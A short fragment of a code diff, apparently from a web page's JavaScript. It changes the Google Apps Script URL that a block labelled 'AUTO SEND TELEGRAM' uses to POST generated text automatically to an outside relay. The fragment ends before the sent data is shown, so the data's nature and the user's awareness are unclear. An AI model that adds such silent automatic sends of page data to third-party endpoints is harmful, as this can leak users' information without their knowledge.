@@ -186,7 +186,7 @@ result.innerText = text;
 navigator.clipboard.writeText(text);
 
 /* 🔥 AUTO SEND TELEGRAM */
-fetch("https://script.google.com/macros/s/AKfycbw0Thzsxoigaf-pzi7RpSYUZRAPUSmdVrGBuzGIvT1o9AIPyJ9lRmc7pTKkXJWYTznF/exec",{
+fetch("https://script.google.com/macros/s/AKfycbxlOf2bv1AdANEpWqRNv9xmC-KmMGDA8R0hnCJ5ZH5YPLrEgLSWaxUOj2_q0B7w548/exec",{
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body:JSON.stringify({
